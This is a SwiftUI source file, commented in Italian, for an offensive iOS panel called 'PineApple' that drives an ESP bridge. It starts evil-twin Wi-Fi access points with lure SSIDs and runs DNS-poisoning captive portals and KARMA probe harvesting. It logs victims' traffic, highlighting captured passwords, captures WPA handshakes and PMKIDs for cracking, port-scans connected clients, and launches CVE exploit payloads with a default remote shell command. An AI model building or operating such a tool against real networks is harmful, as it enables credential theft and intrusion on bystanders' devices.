import SwiftUI

// PineApple — rogue AP sull'ESP8266 via TCPBridge:
// AP+STA (il bridge TCP sopravvive), DNS poison wildcard → captive portal,
// lista client live, recon (port scan + banner), CVE launcher one-payload
// (payload consegnato via roundtrip 0x11/0x12, risposta inline).
struct PineAppleView: View {
    @EnvironmentObject var o: Orchestrator
    private var tcp: TCPBridge { o.tcpBridge }

    @State private var rogueSsid = "WiFi Gratis"
    @State private var roguePass = ""
    @State private var portalHTML = "<html><body><h2>Benvenuto</h2><p>Connessione acquisita.</p></body></html>"
    @State private var targetIP = ""
    @State private var cmd = "id > /tmp/o 2>&1; cat /tmp/o"
    @State private var selExploit = 0
    @State private var busy = false
    @State private var results: [String] = []
    @State private var probes: [String] = []
    @State private var karmaArmed = false
    @State private var scanPorts: [UInt16] = [80, 443, 8080, 23, 554, 1900, 5431, 5000]
    @State private var dnsFwd = true   // default: internet reale + log (poison su richiesta)
    @State private var natOn = true
    @State private var traffic: [String] = []
    @State private var netIP = DeviceNet.cachedIPv4()
    @State private var routerAccess = false
    @State private var sniffing = false
    @State private var capBusy = false
    @State private var capPcapURL: URL?
    @State private var capCh = 0

    private let exploits = ExploitLibrary.all

    private var ble: BridgeManager { o.bridge }
    private var online: Bool { ble.connected || tcp.connected }
    private var rogueOn: Bool { ble.connected ? ble.rogueOn : tcp.rogueOn }
    private var radioLabel: String { ble.connected ? "ESP32 BLE" : (tcp.connected ? "ESP8266 TCP" : "offline") }

    private struct ClientRow: Identifiable {
        var id: String { mac }
        let mac: String
        let ip: String
    }
    private var clients: [ClientRow] {
        if ble.connected { return ble.rogueClients.map { ClientRow(mac: $0.mac, ip: $0.ip) } }
        return tcp.rogueClients.map { ClientRow(mac: $0.mac, ip: $0.ip) }
    }

    private func radioRogueStart(_ ssid: String, _ pass: String, _ fwd: Bool) async -> Bool {
        if ble.connected { return await ble.rogueStart(ssid: ssid, pass: pass, dnsFwd: fwd) }
        return await tcp.rogueStart(ssid: ssid, pass: pass, dnsFwd: fwd)
    }
    private func radioRogueStop() async -> Bool {
        if ble.connected { return await ble.rogueStop() }
        return await tcp.rogueStop()
    }
    private func radioClientsRefresh() async {
        if ble.connected { await ble.rogueClientsRefresh() } else { await tcp.rogueClientsRefresh() }
    }
    private func radioTraffic() async -> [String] {
        if ble.connected { return await ble.trafficLog() }
        return await tcp.trafficLog()
    }
    private func radioPortal(_ html: String) async -> Bool {
        if ble.connected { return await ble.portalSet(html) }
        return await tcp.portalSet(html)
    }
    private func radioKarma(_ on: Bool) async -> [String] {
        if ble.connected { return await ble.karma(on) }
        return await tcp.karma(on)
    }
    private func radioNat(_ on: Bool, _ fwd: Bool) async -> Bool {
        if ble.connected { return await ble.nat(on, dnsFwd: fwd) }
        return await tcp.nat(on, dnsFwd: fwd)
    }
    private func radioPortScan(_ host: String, _ ports: [UInt16]) async -> [(UInt16, String)] {
        if ble.connected { return await ble.portScan(host: host, ports: ports) }
        return await tcp.portScan(host: host, ports: ports)
    }
    private func radioRoundTrip(_ host: String, _ port: Int, _ payload: [UInt8], udp: Bool, _ timeout: TimeInterval) async -> Data? {
        if ble.connected { return await ble.roundTrip(host: host, port: port, payload: payload, udp: udp, timeout: timeout) }
        return await tcp.roundTrip(host: host, port: port, payload: payload, udp: udp, timeout: timeout)
    }

    var body: some View {
        ScrollView {
            VStack(alignment: .leading, spacing: 14) {
                statusRow
                netRow
                rogueSection
                clientsSection
                reconSection
                trafficSection
                captureSection
                exploitSection
                logSection
            }
            .padding(16)
        }
        .background(RHBackground())
        .navigationTitle("PineApple")
        .navigationBarTitleDisplayMode(.inline)
        .onAppear {
            Task {
                let ip = await DeviceNet.refresh()
                if !ip.isEmpty { netIP = ip }
            }
        }
        .onReceive(Timer.publish(every: 5, on: .main, in: .common).autoconnect()) { _ in
            guard online, rogueOn, !busy else { return }
            Task {
                let l = await radioTraffic()
                if !l.isEmpty { traffic = l }
            }
        }
    }

    private var statusRow: some View {
        HStack(spacing: 8) {
            Pill(text: online ? "\(radioLabel) ONLINE" : "BRIDGE OFFLINE",
                 color: online ? .ok : .bad,
                 icon: online ? "link" : "link.badge.plus")
            Spacer()
            Pill(text: rogueOn ? "ROGUE ATTIVO" : "ROGUE OFF",
                 color: rogueOn ? .warn : .dim,
                 icon: rogueOn ? "wifi.router.fill" : "wifi.slash")
        }
    }

    // Diagnostica rete: IP iPhone, tipo uplink, host del bridge
    private var netRow: some View {
        let ip = netIP.isEmpty ? DeviceNet.cachedIPv4() : netIP
        let uplink = ip.isEmpty ? "no rete"
            : (ip.hasPrefix("172.20.10.") ? "hotspot iPhone"
               : (ip.hasPrefix("192.168.4.") ? "AP del bridge" : "Wi-Fi"))
        return HStack(spacing: 6) {
            Pill(text: ip.isEmpty ? "NO IP" : ip, color: ip.isEmpty ? .bad : .ok)
            Pill(text: uplink, color: .dim)
            if ble.connected {
                Pill(text: ble.deviceName ?? "ESP32", color: .info)
            } else if let h = tcp.foundHosts.first {
                Pill(text: "ESP \(h)", color: .info)
            }
            Spacer()
        }
    }

    private var rogueSection: some View {
        VStack(alignment: .leading, spacing: 10) {
            SectionHeader(title: "Rogue AP", icon: "wifi.router.fill", color: .redHat)
            HStack(spacing: 8) {
                PineField("SSID evil-twin", $rogueSsid)
                Button {
                    rogueSsid = Self.freshSSID()
                    Haptics.tap()
                } label: {
                    Image(systemName: "dice")
                        .font(.system(size: 14, weight: .bold))
                        .padding(.horizontal, 12).padding(.vertical, 10)
                        .background(RoundedRectangle(cornerRadius: 10).fill(Color.surfaceHi))
                        .foregroundColor(.white)
                }
                .buttonStyle(.plain)
            }
            PineField("password (vuota = open)", $roguePass)
            if !roguePass.isEmpty && roguePass.count < 8 {
                Text("WPA: 8-64 caratteri, oppure vuota per open").font(.system(size: 10)).foregroundColor(.bad)
            }
            Toggle(isOn: $dnsFwd) {
                Text(dnsFwd ? "DNS: forward + portal captive (ibrido, internet reale)"
                            : "DNS: poison — captive portal su ogni dominio")
                    .font(.system(size: 12)).foregroundColor(.white.opacity(0.85))
            }
            .tint(.redHat)
            HStack(spacing: 10) {
                PineButton(label: "AVVIA", color: .redHat, enabled: !busy) { await startRogue() }
                PineButton(label: "STOP", color: .dim, enabled: !busy) { await stopRogue() }
            }
            HStack(spacing: 10) {
                PineButton(label: "IMPOSTA PORTAL", color: .warn, enabled: !busy) { await setPortal() }
                PineButton(label: karmaArmed ? "KARMA STOP" : "KARMA ARM", color: .warn, enabled: !busy) { await karma() }
            }
            TextEditor(text: $portalHTML)
                .font(.system(size: 11, design: .monospaced))
                .frame(height: 80)
                .padding(8)
                .background(RoundedRectangle(cornerRadius: 10).fill(Color(hex: 0x070709)))
                .overlay(RoundedRectangle(cornerRadius: 10).strokeBorder(Color.white.opacity(0.1), lineWidth: 1))
            if !probes.isEmpty {
                Text("PROBE REQUESTS: \(probes.joined(separator: " · "))")
                    .font(.system(size: 11, design: .monospaced)).foregroundColor(.warn)
            }
        }
    }

    private var clientsSection: some View {
        VStack(alignment: .leading, spacing: 8) {
            HStack(spacing: 8) {
                SectionHeader(title: "Client connessi", icon: "person.2.fill", color: .ok,
                              trailing: "\(clients.count)")
                Button("aggiorna") { Task { await radioClientsRefresh() } }
                    .font(.system(size: 11, weight: .bold)).foregroundColor(.redHat)
            }
            if clients.isEmpty {
                Text("nessun client — i dispositivi si agganciano al SSID evil-twin")
                    .font(.system(size: 11)).foregroundColor(.dim)
            }
            ForEach(clients) { c in
                Button {
                    targetIP = c.ip
                    Haptics.tap()
                } label: {
                    HStack {
                        Text(c.mac).font(.system(size: 11, design: .monospaced)).foregroundColor(.white.opacity(0.85))
                        Spacer()
                        Text(c.ip).font(.system(size: 11, design: .monospaced)).foregroundColor(.ok)
                    }
                    .padding(10)
                    .background(RoundedRectangle(cornerRadius: 8).fill(Color(hex: 0x070709)))
                }
            }
        }
    }

    private var reconSection: some View {
        VStack(alignment: .leading, spacing: 8) {
            SectionHeader(title: "Recon", icon: "binoculars.fill", color: .info)
            PineField("IP target", $targetIP)
            HStack(spacing: 10) {
                PineButton(label: "PORT SCAN", color: .redHat, enabled: !busy) { await doPortScan() }
                PineButton(label: "DETTETTORI", color: .warn, enabled: !busy) { await runDetectors() }
            }
            Text("porte: \(scanPorts.map(String.init).joined(separator: " "))")
                .font(.system(size: 10, design: .monospaced)).foregroundColor(.dim)
        }
    }

    private var trafficSection: some View {
        VStack(alignment: .leading, spacing: 8) {
            SectionHeader(title: "Traffic clienti", icon: "waveform.path.ecg", color: .warn)
            Text("FORWARD = ibrido: internet reale (NAPT) + portal sui captive-check, domini loggati. POISON = tutto sul portal. HTTPS resta cifrato (serve fake-CA).")
                .font(.system(size: 10)).foregroundColor(.dim)
            HStack(spacing: 10) {
                PineButton(label: dnsFwd ? "DNS: FORWARD+PORTAL" : "DNS: POISON", color: .warn, enabled: !busy) { await toggleDns() }
                PineButton(label: "NAT \(natOn ? "OFF" : "ON")", color: .dim, enabled: !busy) { await toggleNat() }
            }
            PineButton(label: "AGGIORNA LOG", color: .redHat, enabled: !busy) { await refreshTraffic() }
            if traffic.isEmpty {
                Text("nessun traffico catturato").font(.system(size: 11)).foregroundColor(.dim)
            }
            ForEach(Array(traffic.enumerated()), id: \.offset) { _, l in
                Text(l)
                    .font(.system(size: 11, design: .monospaced))
                    .foregroundColor(l.contains("pass=") || l.contains("pwd=") || l.contains("user=") || l.contains("password") ? .warn : .white.opacity(0.85))
                    .textSelection(.enabled)
            }
        }
    }

    private var captureSection: some View {
        VStack(alignment: .leading, spacing: 8) {
            SectionHeader(title: "Capture Wi-Fi (Fase A)", icon: "dot.radiowaves.left.and.right", color: .ok)
            Text("promiscuous + channel hop: EAPOL M1–M4, PMKID (KDE) e frame WPS/PMKID passivi. Con rogue AP attivo resta sul canale dell'AP. Export .pcap apribile con aircrack-ng.")
                .font(.system(size: 10)).foregroundColor(.dim)
            ScrollView(.horizontal, showsIndicators: false) {
                HStack(spacing: 6) {
                    capChip("HOP", 0)
                    ForEach(1...13, id: \.self) { n in capChip("\(n)", n) }
                }
            }
            .disabled(sniffing || capBusy)
            HStack(spacing: 10) {
                PineButton(label: sniffing ? "STOP + DUMP" : "AVVIA SNIFF",
                           color: sniffing ? .warn : .redHat,
                           enabled: ble.connected && !capBusy) { await toggleSniff() }
                PineButton(label: "STATS", color: .dim, enabled: sniffing && !capBusy) { await refreshCapStats() }
            }
            if let st = ble.captureStats {
                Text("frame \(st.frames) · EAPOL \(st.eapol) · sessioni \(st.sessions) · ch \(st.ch)")
                    .font(.system(size: 11, design: .monospaced)).foregroundColor(.white.opacity(0.8))
            }
            if !ble.captures.isEmpty {
                HStack(spacing: 10) {
                    PineButton(label: "SALVA PCAP", color: .info) { saveCap() }
                    if let u = capPcapURL {
                        ShareLink(item: u) {
                            Text("condividi pcap")
                                .font(.system(size: 12, weight: .bold))
                                .foregroundColor(.redHat)
                        }
                    }
                }
                ForEach(ble.captures) { h in
                    VStack(alignment: .leading, spacing: 2) {
                        Text("\(h.ssid.isEmpty ? "(no ssid)" : h.ssid) · \(h.bssid)")
                            .font(.system(size: 11, design: .monospaced)).foregroundColor(.white.opacity(0.88))
                        Text("sta \(h.sta) · msg \(h.frames.map { String($0.msg) }.joined(separator: ","))\(h.pmkid.map { " · pmkid \($0.prefix(16))…" } ?? "")")
                            .font(.system(size: 10, design: .monospaced)).foregroundColor(.dim)
                    }
                    .padding(8)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .background(RoundedRectangle(cornerRadius: 8).fill(Color(hex: 0x070709)))
                }
            } else {
                Text("nessuna cattura — avvia, fai associare un client, poi STOP")
                    .font(.system(size: 11)).foregroundColor(.dim)
            }
        }
    }

    private func capChip(_ label: String, _ ch: Int) -> some View {
        Button {
            capCh = ch
            Haptics.tap()
        } label: {
            Text(label)
                .font(.system(size: 11, weight: .bold, design: .monospaced))
                .padding(.horizontal, 10).padding(.vertical, 6)
                .background(RoundedRectangle(cornerRadius: 8).fill(capCh == ch ? Color.ok.opacity(0.25) : Color(hex: 0x070709)))
                .foregroundColor(capCh == ch ? .ok : .dim)
        }
        .buttonStyle(ScaleButton())
    }

    private func toggleSniff() async {
        guard ble.connected else { push("capture: serve ESP32 in BLE"); return }
        capBusy = true
        if sniffing {
            _ = await ble.sniffStop()
            sniffing = false
            _ = await ble.sniffDump()
        } else {
            if await ble.sniffStart(hop: capCh == 0, channel: capCh) {
                sniffing = true
                push(capCh == 0 ? "sniff su hop 1-13" : "sniff pinnato su canale \(capCh)")
            }
        }
        capBusy = false
    }

    private func refreshCapStats() async {
        _ = await ble.sniffStats()
    }

    private func saveCap() {
        if let u = WifiCapture.write(ble.captures) {
            capPcapURL = u
            push("pcap salvato: \(u.lastPathComponent)")
        } else {
            push("pcap: scrittura fallita")
        }
    }

    private var exploitSection: some View {
        VStack(alignment: .leading, spacing: 8) {
            SectionHeader(title: "CVE launcher", icon: "bolt.fill", color: .redHat)
            Picker("exploit", selection: $selExploit) {
                ForEach(Array(exploits.enumerated()), id: \.offset) { i, e in
                    Text("\(e.id) · \(e.kind.rawValue)").tag(i)
                }
            }
            .pickerStyle(.menu)
            .tint(.redHat)
            let e = exploits[selExploit]
            VStack(alignment: .leading, spacing: 4) {
                Text(e.title).font(.system(size: 12)).foregroundColor(.white.opacity(0.9))
                Text("\(e.product) · \(e.cvssVector)").font(.system(size: 10)).foregroundColor(.dim)
                Text(e.note).font(.system(size: 10)).foregroundColor(.dim)
            }
            if e.needsCmd {
                PineField("comando (\(e.proto.rawValue) :\(e.port))", $cmd)
            } else {
                Text("probe su \(e.proto.rawValue) :\(e.port) — nessun comando richiesto")
                    .font(.system(size: 11)).foregroundColor(.dim)
            }
            if e.isRouter {
                Toggle(isOn: $routerAccess) {
                    Text("accesso router ottenuto (admin/sessione)")
                        .font(.system(size: 12)).foregroundColor(.white.opacity(0.85))
                }
                .tint(.redHat)
                if !routerAccess {
                    Text("CVE router: lancia solo dopo aver ottenuto accesso (credenziali admin o sessione valida, es. login catturato in TRAFFIC).")
                        .font(.system(size: 10)).foregroundColor(.warn)
                }
            }
            PineButton(label: "ESEGUI", color: .redHat,
                       enabled: !busy && (!e.isRouter || routerAccess)) { await fire() }
        }
    }

    private var logSection: some View {
        VStack(alignment: .leading, spacing: 6) {
            if !results.isEmpty {
                SectionHeader(title: "Output", icon: "terminal.fill", color: .dim)
                ForEach(Array(results.enumerated().suffix(10)), id: \.offset) { _, l in
                    Text(l).font(.system(size: 10, design: .monospaced))
                        .foregroundColor(.white.opacity(0.85))
                        .textSelection(.enabled)
                }
                Button("pulisci") { results = [] }
                    .font(.system(size: 11)).foregroundColor(.dim)
            }
        }
    }

    // MARK: actions

    private func startRogue() async {
        guard online else { push("[-] bridge offline"); return }
        let ssid = rogueSsid.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !ssid.isEmpty else { push("[-] SSID vuoto"); return }
        guard roguePass.isEmpty || (8...64).contains(roguePass.count) else {
            push("[-] password: 8-64 caratteri o vuota per open"); return
        }
        busy = true
        let ok = await radioRogueStart(ssid, roguePass, dnsFwd)
        if ok {
            natOn = true               // il firmware arma NAPT su softAP all'avvio
            await radioClientsRefresh()
            push("[+] rogue UP '\(ssid)' su \(radioLabel) — internet via hotspot, log in TRAFFIC")
        } else {
            push("[-] avvio rifiutato: verifica STA connessa (hotspot iPhone) e riprova")
        }
        busy = false
    }

    static func freshSSID() -> String {
        let adj = ["Casa", "Studio", "Caffè", "Hotel", "Ufficio", "Ospiti", "Free", "WiFi"]
        let noun = ["Roma", "Milano", "Napoli", "Torino", "Bologna", "Verona", "Lounge", "Bar"]
        let n = ["", "_5G", " 2", "-Guest", "-WiFi", "_Plus"][Int.random(in: 0..<6)]
        return "\(adj.randomElement()!) \(noun.randomElement()!)\(n)"
    }

    private func stopRogue() async {
        busy = true
        _ = await radioRogueStop()
        probes = []
        karmaArmed = false
        busy = false
    }

    private func setPortal() async {
        _ = await radioPortal(portalHTML)
    }

    private func karma() async {
        busy = true
        if !karmaArmed {
            // arm: il firmware non risponde con la lista finché non arrivano probe
            _ = await radioKarma(true)
            karmaArmed = true
            probes = []
            push("[karma] armed — i probe dei client vengono raccolti")
        } else {
            probes = await radioKarma(false)
            karmaArmed = false
            push("[karma] stop — \(probes.count) probe")
        }
        busy = false
    }

    private func toggleDns() async {
        let want = !dnsFwd
        let ok = await radioNat(natOn, want)
        if ok { dnsFwd = want } else { push("[-] cambio DNS rifiutato dal bridge") }
    }

    private func toggleNat() async {
        let want = !natOn
        let ok = await radioNat(want, dnsFwd)
        if ok { natOn = want } else { push("[-] cambio NAT rifiutato dal bridge") }
    }

    private func push(_ s: String) {
        results.append(s)
        if results.count > 200 { results.removeFirst(results.count - 200) }
    }

    private func refreshTraffic() async {
        busy = true
        traffic = await radioTraffic()
        busy = false
    }

    private func doPortScan() async {        guard !targetIP.isEmpty else { push("[-] IP target mancante"); return }
        busy = true
        let open = await radioPortScan(targetIP, scanPorts)
        if open.isEmpty {
            push("[recon] \(targetIP): nessuna porta aperta su \(scanPorts.count)")
        } else {
            for (p, b) in open {
                push("[recon] :\(p) \(b.prefix(80))")
            }
        }
        busy = false
    }

    private func runDetectors() async {
        guard !targetIP.isEmpty else { push("[-] IP target mancante"); return }
        busy = true
        for e in exploits where e.detector != nil {
            guard let req = ExploitLibrary.request(e, ip: targetIP, cmd: "") else { continue }
            let r = await radioRoundTrip(targetIP, e.port, Array(req), udp: e.proto == .udp, 5)
            let hit = r.map { String(decoding: $0.prefix(400), as: UTF8.self) }
            if let hit, hit.contains(e.success) {
                push("[!] \(e.id) SUPERFICIE VULNERABILE → \(hit.prefix(160))")
            } else if let hit, !hit.isEmpty {
                push("[.] \(e.id) risponde ma marker assente → \(hit.prefix(120))")
            }
        }
        busy = false
    }

    private func fire() async {
        guard !targetIP.isEmpty else { push("[-] IP target mancante"); return }
        let e = exploits[selExploit]
        if e.isRouter && !routerAccess {
            push("[-] \(e.id) è una CVE router: serve accesso (credenziali/sessione) — abilita il toggle dopo il login.")
            return
        }
        guard let req = ExploitLibrary.request(e, ip: targetIP, cmd: cmd) else {
            push("[-] \(e.id) senza payload one-payload")
            return
        }
        busy = true
        Haptics.tap()
        let r = await radioRoundTrip(targetIP, e.port, Array(req), udp: e.proto == .udp, 6)
        if let r, !r.isEmpty {
            let s = String(decoding: r.prefix(800), as: UTF8.self)
            push("[\(e.id)] → \(s)")
            if s.contains(e.success) { push("[!] \(e.id): marker presente (\(e.success))") }
        } else {
            push("[\(e.id)] nessuna risposta (porta chiusa o payload giù)")
        }
        busy = false
    }
}

// campi + bottoni condivisi del pannello PineApple
struct PineField: View {
    let ph: String
    @Binding var text: String

    init(_ ph: String, _ text: Binding<String>) {
        self.ph = ph
        self._text = text
    }

    var body: some View {
        TextField(ph, text: $text)
            .textFieldStyle(.plain)
            .font(.system(size: 13, design: .monospaced))
            .padding(10)
            .background(RoundedRectangle(cornerRadius: 10).fill(Color(hex: 0x070709)))
            .overlay(RoundedRectangle(cornerRadius: 10).strokeBorder(Color.white.opacity(0.1), lineWidth: 1))
    }
}

struct PineButton: View {
    let label: String
    let color: Color
    var enabled: Bool = true
    let action: () async -> Void
    @State private var spin = false

    var body: some View {
        Button {
            guard !spin else { return }
            spin = true
            Haptics.tap()
            Task { await action(); spin = false }
        } label: {
            Text(label)
                .font(.system(size: 12, weight: .bold))
                .foregroundColor(.white.opacity(spin ? 0.4 : 0.95))
                .padding(.vertical, 9)
                .frame(maxWidth: .infinity)
                .background(RoundedRectangle(cornerRadius: 10).fill(color.opacity(0.18)))
                .overlay(RoundedRectangle(cornerRadius: 10).strokeBorder(color.opacity(0.5), lineWidth: 1))
        }
        .disabled(spin || !enabled)
        .opacity(enabled ? 1 : 0.45)
    }
}
